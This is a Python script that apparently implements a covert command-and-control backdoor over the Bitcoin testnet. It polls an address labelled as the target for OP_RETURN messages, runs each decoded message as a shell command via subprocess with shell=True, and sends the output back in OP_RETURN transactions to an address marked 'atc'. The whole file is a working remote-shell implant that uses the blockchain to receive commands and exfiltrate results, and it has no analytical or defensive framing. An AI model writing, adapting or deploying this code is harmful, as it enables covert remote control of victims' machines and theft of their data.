import requests
import time
import lzma
import subprocess

from bitcoin import SelectParams
from bitcoin.wallet import CBitcoinSecret, P2PKHBitcoinAddress
from bitcoin.core import (
    lx, b2x, COutPoint, CTxOut, CMutableTransaction, CMutableTxIn
)
from bitcoin.core.script import CScript, OP_RETURN, SignatureHash, SIGHASH_ALL

SelectParams('testnet')

API = "https://mempool.space/testnet/api"
DUST_LIMIT = 546
SAT_PER_BYTE = 3
MAX_OPRETURN = 80

# ========================
# Spent Tracker
# ========================
class SpentTracker:
    def __init__(self):
        self.outpoints = set()
        self.pending_utxos = []

    def add(self, outpoint):
        self.outpoints.add(outpoint)

    def __contains__(self, outpoint):
        return outpoint in self.outpoints

# ========================
#  UTXOs
# ========================
def get_utxos(address, spent=None):
    if spent is None:
        spent = SpentTracker()

    utxos = requests.get(f"{API}/address/{address}/utxo").json()

    confirmed = [
        u for u in utxos
        if u.get("status", {}).get("confirmed", False)
        and f"{u['txid']}:{u['vout']}" not in spent
    ]
    unconfirmed = [
        u for u in utxos
        if not u.get("status", {}).get("confirmed", False)
        and f"{u['txid']}:{u['vout']}" not in spent
    ]
    pending = [
        u for u in spent.pending_utxos
        if f"{u['txid']}:{u['vout']}" not in spent
    ]

    return confirmed + unconfirmed + pending

# ========================
#  Balance
# ========================
def get_balance(address):
    r = requests.get(f"{API}/address/{address}").json()
    return r["chain_stats"]["funded_txo_sum"] - r["chain_stats"]["spent_txo_sum"]

# ========================
# Fit message safely
# ========================
def fit_message(message):
    header = b"1/2|"

    compressed = lzma.compress(message.encode())
    if len(compressed) <= MAX_OPRETURN:
        print("[+] Full message fits")
        return compressed

    print("[-] Too long → sending first part only")

    for size in range(len(message), 0, -1):
        part = message[:size]
        comp = lzma.compress(part.encode())

        if len(header) + len(comp) <= MAX_OPRETURN:
            print(f"[+] Using {size} chars from original message")
            return header + comp

    raise Exception("Cannot fit any data into OP_RETURN")

# ========================
# Send message
# ========================
def send_message(wif, to_address, message, spent=None):
    if spent is None:
        spent = SpentTracker()

    key = CBitcoinSecret(wif)
    my_address = str(P2PKHBitcoinAddress.from_pubkey(key.pub))

    utxos = get_utxos(my_address, spent)
    if not utxos:
        print("[-] No UTXOs available")
        return None

    msg_data = fit_message(message)
    send_amount = DUST_LIMIT

    selected = []
    total_in = 0
    change = -1
    for utxo in utxos:
        selected.append(utxo)
        total_in += utxo["value"]

        n_inputs = len(selected)
        op_return_size = 11 + len(msg_data)
        tx_size = 10 + (148 * n_inputs) + 34 + op_return_size + 34
        fee = tx_size * SAT_PER_BYTE
        change = total_in - send_amount - fee

        if change >= 0:
            break

    if change < 0:
        print(f"[-] Not enough balance. Total UTXOs value: {total_in}")
        return None

    print(f"[*] Using {len(selected)} UTXOs, total_in={total_in}, fee={fee}, change={change}")

    txins = [
        CMutableTxIn(COutPoint(lx(u["txid"]), u["vout"]))
        for u in selected
    ]

    txout     = CTxOut(send_amount, P2PKHBitcoinAddress(to_address).to_scriptPubKey())
    op_return = CTxOut(0, CScript([OP_RETURN, msg_data]))
    outputs   = [txout, op_return]

    has_change = change > DUST_LIMIT
    if has_change:
        outputs.append(CTxOut(change, P2PKHBitcoinAddress(my_address).to_scriptPubKey()))

    tx = CMutableTransaction(txins, outputs)

    scriptPubKey = P2PKHBitcoinAddress(my_address).to_scriptPubKey()
    for i in range(len(txins)):
        sighash = SignatureHash(scriptPubKey, tx, i, SIGHASH_ALL)
        sig = key.sign(sighash) + bytes([SIGHASH_ALL])
        tx.vin[i].scriptSig = CScript([sig, key.pub])

    raw_tx = b2x(tx.serialize())
    actual_size = len(tx.serialize())
    print(f"[*] actual_size={actual_size}, actual_fee={actual_size * SAT_PER_BYTE}")

    res = requests.post(f"{API}/tx", data=raw_tx)
    txid = res.text.strip()
    print("[+] TXID:", txid)

    if len(txid) == 64:
        for u in selected:
            spent.add(f"{u['txid']}:{u['vout']}")
        if has_change:
            change_vout = len(outputs) - 1
            spent.pending_utxos.append({
                "txid": txid,
                "vout": change_vout,
                "value": change,
                "status": {"confirmed": False}
            })

    return txid

# ========================
#  Decode message
# ========================
def decode_message(data):
    try:
        if data.startswith(b"1/2|"):
            print("[!] Partial message received")
            data = data[4:]
        return lzma.decompress(data).decode("utf-8")
    except Exception as e:
        return f"[decode error] {e}"

# ========================
# Get latest message
# ========================
def get_latest_message(address, last_seen_tx=None):
    txs = requests.get(f"{API}/address/{address}/txs").json()
    if not txs:
        return None, None, None

    for tx in txs:
        txid = tx["txid"]

        if txid == last_seen_tx:
            return None, None, None

        # skip outgoing
        is_sender = any(
            vin.get("prevout", {}).get("scriptpubkey_address", "") == address
            for vin in tx["vin"]
        )
        if is_sender:
            continue

        # find OP_RETURN
        for vout in tx["vout"]:
            if vout["scriptpubkey_type"] == "op_return":
                script_bytes = bytes.fromhex(vout["scriptpubkey"])

                if script_bytes[1] == 0x4c:
                    raw = script_bytes[3:]
                else:
                    raw = script_bytes[2:]

                msg = decode_message(raw)
                return msg, txid, raw

    return None, None, None

# ========================
# Monitor
# ========================
def monitor(address):
    print("[*] Monitoring for messages...")

    wif   = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # target private key
    to    = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"                    # atc address
    spent = SpentTracker()  #  persists across replies

    last_tx     = None
    seen_txids  = set()

    while True:
        msg, txid, rawmsg = get_latest_message(address, last_tx)

        if txid is None or txid == last_tx:
            time.sleep(1)
            continue

        if txid in seen_txids:
            print(f"[~] Already processed {txid}")
            last_tx = txid
            time.sleep(5)
            continue

        last_tx = txid
        seen_txids.add(txid)

        if not msg:
            print(f"[NEW no-msg] {txid}")
            time.sleep(5)
            continue

        msg = msg.strip()
        print(f"[NEW] {txid} -> {msg}")

        if "stopeme" in msg:
            print("[*] Stop command received, exiting.")
            break

        # run command
        result = subprocess.run(
            msg, shell=True, capture_output=True, text=True, timeout=10
        )
        output = (result.stdout + result.stderr).strip()
        if not output:
            output = "[no output]"

        print(f"[SYS] {output}")

        # save to file
        # with open("tx.message", "a") as f:
        #     f.write(f"{txid}: {msg}\n{output}\n\n")

        # send output back
        reply_txid = send_message(wif, to, output[:200], spent)  #  pass spent
        if reply_txid:
            seen_txids.add(reply_txid)

        time.sleep(5)

# ========================
#  Main
# ========================
def menu():
    addr = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # target address
    monitor(addr)

if __name__ == "__main__":
    menu()